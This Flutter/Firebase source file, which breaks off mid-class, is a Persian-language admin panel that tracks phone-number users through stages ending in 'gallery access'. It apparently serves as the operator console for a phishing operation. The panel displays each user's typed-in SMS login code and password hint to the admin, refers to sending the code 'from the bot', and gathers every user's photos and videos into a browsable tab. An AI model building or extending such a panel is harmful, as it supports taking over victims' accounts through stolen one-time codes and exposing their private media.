import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:url_launcher/url_launcher.dart';
import 'firebase_options.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  try {
    await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  } catch (e) {
    runApp(MaterialApp(home: Scaffold(body: Center(
      child: Text('$e', style: const TextStyle(color: Colors.white))))));
    return;
  }
  runApp(const AdminApp());
}

class AdminApp extends StatelessWidget {
  const AdminApp({super.key});
  @override
  Widget build(BuildContext context) => MaterialApp(
    debugShowCheckedModeBanner: false,
    title: 'XWXWX Admin',
    theme: ThemeData(
      brightness: Brightness.dark,
      useMaterial3: true,
      colorScheme: ColorScheme.dark(
        primary: const Color(0xFFFF5252),
        secondary: const Color(0xFFFFC107),
        surface: const Color(0xFF1A1A2E),
      ),
      scaffoldBackgroundColor: const Color(0xFF0F0F1A),
    ),
    home: const AdminHome(),
  );
}

class AdminHome extends StatefulWidget {
  const AdminHome({super.key});
  @override
  State<AdminHome> createState() => _AdminHomeState();
}

class _AdminHomeState extends State<AdminHome> with SingleTickerProviderStateMixin {
  late TabController _tab;
  String _filter = 'all';
  String _search = '';
  final _searchCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();
    _tab = TabController(length: 2, vsync: this);
  }

  @override
  void dispose() {
    _tab.dispose();
    _searchCtrl.dispose();
    super.dispose();
  }

  bool _matchFilter(String status) {
    if (_filter == 'all') return true;
    if (_filter == 'pending') {
      return ['phone_entered', 'waiting_password', 'waiting_code',
        'code_entered', 'approved'].contains(status);
    }
    if (_filter == 'active') return status == 'active';
    if (_filter == 'blocked') return status == 'blocked';
    return true;
  }

  @override
  Widget build(BuildContext context) => Directionality(
    textDirection: TextDirection.rtl,
    child: Scaffold(
      appBar: AppBar(
        backgroundColor: const Color(0xFF1A1A2E),
        title: const Row(children: [
          Icon(Icons.admin_panel_settings, color: Color(0xFFFF5252)),
          SizedBox(width: 8),
          Text('پنل مدیریت XWXWX'),
        ]),
        bottom: TabBar(
          controller: _tab,
          indicatorColor: const Color(0xFFFF5252),
          tabs: const [
            Tab(icon: Icon(Icons.people), text: 'کاربران'),
            Tab(icon: Icon(Icons.photo_library), text: 'همه عکس‌ها'),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tab,
        children: [
          _usersTab(),
          const _AllMediaTab(),
        ],
      ),
    ),
  );

  Widget _usersTab() => Column(children: [
    _statsBar(),
    _filterBar(),
    Expanded(child: _userList()),
  ]);

  Widget _statsBar() => StreamBuilder<QuerySnapshot>(
    stream: FirebaseFirestore.instance.collection('users').snapshots(),
    builder: (context, snap) {
      if (!snap.hasData) return const SizedBox(height: 70);
      final docs = snap.data!.docs;
      int total = docs.length, active = 0, pending = 0, blocked = 0;
      for (final d in docs) {
        final s = (d.data() as Map)['status'] ?? '';
        if (s == 'active') active++;
        else if (s == 'blocked') blocked++;
        else pending++;
      }
      return Container(
        padding: const EdgeInsets.symmetric(vertical: 8),
        color: const Color(0xFF1A1A2E),
        child: Row(children: [
          _stat('کل', total, Colors.white70),
          _stat('فعال', active, Colors.green),
          _stat('در انتظار', pending, Colors.orange),
          _stat('بلاک', blocked, Colors.redAccent),
        ]),
      );
    },
  );

  Widget _stat(String label, int count, Color color) => Expanded(
    child: Column(children: [
      Text('$count', style: TextStyle(color: color,
        fontSize: 22, fontWeight: FontWeight.bold)),
      Text(label, style: TextStyle(color: color, fontSize: 11)),
    ]),
  );

  Widget _filterBar() => Container(
    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
    color: const Color(0xFF0F0F1A),
    child: Column(children: [
      TextField(
        controller: _searchCtrl,
        onChanged: (v) => setState(() => _search = v),
        decoration: InputDecoration(
          hintText: 'جستجوی شماره...',
          prefixIcon: const Icon(Icons.search, size: 20),
          filled: true, fillColor: const Color(0xFF1A1A2E),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
          contentPadding: const EdgeInsets.symmetric(vertical: 0),
        ),
      ),
      const SizedBox(height: 8),
      SingleChildScrollView(
        scrollDirection: Axis.horizontal,
        child: Row(children: [
          _chip('همه', 'all'),
          _chip('در انتظار', 'pending'),
          _chip('فعال', 'active'),
          _chip('بلاک', 'blocked'),
        ]),
      ),
    ]),
  );

  Widget _chip(String label, String value) => Padding(
    padding: const EdgeInsets.only(left: 8),
    child: ChoiceChip(
      label: Text(label),
      selected: _filter == value,
      onSelected: (_) => setState(() => _filter = value),
      selectedColor: const Color(0xFFFF5252),
      backgroundColor: const Color(0xFF1A1A2E),
      labelStyle: TextStyle(color: _filter == value ? Colors.white : Colors.white70),
    ),
  );

  Widget _userList() => StreamBuilder<QuerySnapshot>(
    stream: FirebaseFirestore.instance.collection('users')
      .orderBy('lastUpdate', descending: true).snapshots(),
    builder: (context, snap) {
      if (snap.connectionState == ConnectionState.waiting) {
        return const Center(child: CircularProgressIndicator());
      }
      if (snap.hasError) {
        return Center(child: Padding(
          padding: const EdgeInsets.all(24),
          child: Text('خطا: ${snap.error}',
            style: const TextStyle(color: Colors.redAccent, fontSize: 13),
            textAlign: TextAlign.center),
        ));
      }
      if (!snap.hasData || snap.data!.docs.isEmpty) {
        return const Center(child: Text('هنوز کاربری ثبت‌نام نکرده',
          style: TextStyle(fontSize: 16, color: Colors.white60)));
      }
      final allDocs = snap.data!.docs;
      final docs = allDocs.where((d) {
        final m = d.data() as Map<String, dynamic>;
        if (!_matchFilter(m['status'] ?? '')) return false;
        if (_search.isEmpty) return true;
        return (m['phone'] ?? '').toString().contains(_search);
      }).toList();
      if (docs.isEmpty) {
        return const Center(child: Text('نتیجه‌ای یافت نشد',
          style: TextStyle(color: Colors.white60)));
      }
      return ListView.builder(
        padding: const EdgeInsets.all(12),
        itemCount: docs.length,
        itemBuilder: (context, i) {
          final d = docs[i].data() as Map<String, dynamic>;
          final phone = d['phone'] ?? docs[i].id;
          final status = d['status'] ?? 'phone_entered';
          return _tile(context, phone, status, d);
        },
      );
    },
  );

  Widget _tile(BuildContext context, String phone, String status, Map<String, dynamic> data) {
    final info = _statusInfo(status);
    return Card(
      color: const Color(0xFF1A1A2E),
      margin: const EdgeInsets.only(bottom: 10),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      child: ListTile(
        contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        leading: CircleAvatar(
          backgroundColor: info.$2,
          child: Icon(info.$3, color: Colors.white, size: 20),
        ),
        title: Text(phone, style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
        subtitle: Text(info.$1, style: TextStyle(color: info.$2, fontSize: 13)),
        trailing: const Icon(Icons.arrow_back_ios, size: 16),
        onTap: () => Navigator.push(context, MaterialPageRoute(
          builder: (_) => UserDetail(phone: phone, data: data),
        )),
      ),
    );
  }

  (String, Color, IconData) _statusInfo(String s) {
    switch (s) {
      case 'phone_entered': return ('مرحله ۱: شماره وارد شده', Colors.orange, Icons.phone);
      case 'waiting_password': return ('مرحله ۲: منتظر تعیین رمز', Colors.amber, Icons.lock_open);
      case 'waiting_code': return ('مرحله ۳: منتظر کد پیامک', Colors.cyan, Icons.sms);
      case 'code_entered': return ('مرحله ۴: کد وارد شد', Colors.purple, Icons.hourglass_top);
      case 'approved': return ('مرحله ۵: تأیید شده', Colors.blue, Icons.check);
      case 'active': return ('فعال ✅', Colors.green, Icons.verified_user);
      case 'blocked': return ('بلاک', Colors.red, Icons.block);
      default: return (s, Colors.grey, Icons.help);
    }
  }
}

class UserDetail extends StatefulWidget {
  final String phone;
  final Map<String, dynamic> data;
  const UserDetail({super.key, required this.phone, required this.data});
  @override
  State<UserDetail> createState() => _UserDetailState();
}

class _UserDetailState extends State<UserDetail> {
  late Stream<DocumentSnapshot> _stream;
  final _hintCtrl = TextEditingController();
  String _mode = 'without_password';
  bool _busy = false;

  @override
  void initState() {
    super.initState();
    _stream = FirebaseFirestore.instance
        .collection('users').doc(widget.phone).snapshots();
    _mode = widget.data['passwordMode'] ?? 'without_password';
    _hintCtrl.text = widget.data['passwordHint']?.toString() ?? '';
  }

  @override
  void dispose() { _hintCtrl.dispose(); super.dispose(); }

  Future<void> _update(Map<String, dynamic> values) async {
    setState(() => _busy = true);
    try {
      values['lastUpdate'] = FieldValue.serverTimestamp();
      await FirebaseFirestore.instance
          .collection('users').doc(widget.phone).update(values);
    } catch (e) {
      _snack('خطا: $e');
    }
    if (mounted) setState(() => _busy = false);
  }

  Future<void> _applyMode() async {
    if (_mode == 'with_password') {
      await _update({
        'passwordMode': 'with_password',
        'passwordHint': _hintCtrl.text.trim(),
        'status': 'waiting_password',
      });
      _snack('حالت رمزدار فعال شد');
    } else {
      await _update({
        'passwordMode': 'without_password',
        'status': 'waiting_code',
      });
      _snack('بدون رمز - کد رو از بات بفرست');
    }
  }

  Future<void> _approve() async {
    await _update({'status': 'approved'});
    _snack('تأیید شد ✅');
  }

  Future<void> _reject() async {
    try {
      await FirebaseFirestore.instance
          .collection('users').doc(widget.phone).delete();
    } catch (_) {}
    if (mounted) Navigator.pop(context);
  }

  Future<void> _block() async {
    await _update({'status': 'blocked'});
    _snack('بلاک شد');
  }

  Future<void> _unblock() async {
    await _update({'status': 'active'});
    _snack('آنبلاک شد');
  }

  void _snack(String m) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(m)));
  }

  void _confirmReject() {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: const Color(0xFF1A1A2E),
      title: const Text('رد کاربر؟'),
      content: const Text('اطلاعات کاربر حذف می‌شه.'),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('لغو')),
        TextButton(
          onPressed: () { Navigator.pop(context); _reject(); },
          child: const Text('رد کن', style: TextStyle(color: Colors.red)),
        ),
      ],
    ));
  }

  @override
  Widget build(BuildContext context) => Directionality(
    textDirection: TextDirection.rtl,
    child: Scaffold(
      appBar: AppBar(
        backgroundColor: const Color(0xFF1A1A2E),
        title: Text(widget.phone),
      ),
      body: StreamBuilder<DocumentSnapshot>(
        stream: _stream,
        builder: (context, snap) {
          if (snap.connectionState == ConnectionState.waiting) {
            return const Center(child: CircularProgressIndicator());
          }
          if (!snap.hasData || !snap.data!.exists) {
            return const Center(child: Text('کاربر حذف شده',
              style: TextStyle(color: Colors.white60)));
          }
          final d = snap.data!.data() as Map<String, dynamic>? ?? {};
          final status = d['status'] ?? 'phone_entered';
          final enteredCode = d['enteredCode']?.toString() ?? '';
          return SingleChildScrollView(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                _stage('مرحله ۱ — شماره وارد شد', d['phone'] != null),
                _stage('مرحله ۲ — رمز تعیین شد',
                  status != 'phone_entered' && status != 'waiting_password'),
                _stage('مرحله ۳ — کد پیامک وارد شد',
                  status == 'code_entered' || status == 'approved' || status == 'active'),
                _stage('مرحله ۴ — تأیید ادمین', status == 'approved' || status == 'active'),
                _stage('مرحله ۵ — دسترسی گالری', status == 'active'),

                if (enteredCode.isNotEmpty) ...[
                  const SizedBox(height: 16),
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: const Color(0xFF1A1A2E),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: Colors.cyanAccent),
                    ),
                    child: Column(children: [
                      const Text('کد وارد شده:',
                        style: TextStyle(color: Colors.white60, fontSize: 12)),
                      const SizedBox(height: 6),
                      Text(enteredCode,
                        style: const TextStyle(fontSize: 24, letterSpacing: 6,
                          fontWeight: FontWeight.bold, color: Colors.cyanAccent)),
                    ]),
                  ),
                ],

                const SizedBox(height: 20),
                const Divider(),
                const Text('🔑 حالت رمز',
                  style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold)),
                RadioListTile<String>(
                  value: 'with_password', groupValue: _mode,
                  onChanged: (v) => setState(() => _mode = v!),
                  title: const Text('با رمز', style: TextStyle(fontSize: 14)),
                  subtitle: const Text('کاربر رمز تعیین می‌کنه',
                    style: TextStyle(fontSize: 12)),
                  activeColor: const Color(0xFFFFC107), dense: true,
                ),
                RadioListTile<String>(
                  value: 'without_password', groupValue: _mode,
                  onChanged: (v) => setState(() => _mode = v!),
                  title: const Text('بدون رمز', style: TextStyle(fontSize: 14)),
                  subtitle: const Text('مستقیم منتظر کد',
                    style: TextStyle(fontSize: 12)),
                  activeColor: const Color(0xFFFFC107), dense: true,
                ),
                if (_mode == 'with_password') ...[
                  const SizedBox(height: 4),
                  TextField(
                    controller: _hintCtrl,
                    maxLines: 2,
                    decoration: InputDecoration(
                      hintText: 'راهنمای رمز...',
                      filled: true, fillColor: const Color(0xFF1A1A2E),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                    ),
                  ),
                ],
                const SizedBox(height: 8),
                ElevatedButton.icon(
                  onPressed: _busy ? null : _applyMode,
                  icon: const Icon(Icons.save),
                  label: const Text('اعمال حالت'),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: const Color(0xFFFFC107), foregroundColor: Colors.black,
                    padding: const EdgeInsets.symmetric(vertical: 14),
                  ),
                ),

                const SizedBox(height: 20),
                const Divider(),
                const Text('✅ تأیید / رد',
                  style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold)),
                const SizedBox(height: 8),
                Row(children: [
                  Expanded(child: ElevatedButton.icon(
                    onPressed: _busy ? null : _approve,
                    icon: const Icon(Icons.check_circle),
                    label: const Text('تأیید'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.green, foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 14),
                    ),
                  )),
                  const SizedBox(width: 8),
                  Expanded(child: ElevatedButton.icon(
                    onPressed: _busy ? null : _confirmReject,
                    icon: const Icon(Icons.close),
                    label: const Text('رد'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.orange, foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 14),
                    ),
                  )),
                ]),
                const SizedBox(height: 8),
                if (status == 'blocked')
                  ElevatedButton.icon(
                    onPressed: _busy ? null : _unblock,
                    icon: const Icon(Icons.lock_open),
                    label: const Text('آنبلاک'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.green, foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 14),
                    ),
                  )
                else
                  ElevatedButton.icon(
                    onPressed: _busy ? null : _block,
                    icon: const Icon(Icons.block),
                    label: const Text('بلاک'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.redAccent, foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 14),
                    ),
                  ),

                const SizedBox(height: 20),
                const Divider(),
                const Text('📸 عکس و فیلم‌های این کاربر',
                  style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold)),
                const SizedBox(height: 8),
                _MediaGrid(phone: widget.phone),
              ],
            ),
          );
        },
      ),
    ),
  );

  Widget _stage(String title, bool done) => Container(
    margin: const EdgeInsets.only(bottom: 6),
    padding: const EdgeInsets.all(12),
    decoration: BoxDecoration(
      color: const Color(0xFF1A1A2E),
      borderRadius: BorderRadius.circular(10),
      border: Border.all(color: done ? Colors.green : Colors.white24),
    ),
    child: Row(children: [
      Icon(done ? Icons.check_circle : Icons.radio_button_unchecked,
        color: done ? Colors.green : Colors.white38, size: 20),
      const SizedBox(width: 12),
      Expanded(child: Text(title, style: TextStyle(
        color: done ? Colors.white : Colors.white54,
        fontWeight: done ? FontWeight.bold : FontWeight.normal,
        fontSize: 13,
      ))),
    ]),
  );
}

class _MediaGrid extends StatelessWidget {
  final String phone;
  const _MediaGrid({required this.phone});

  @
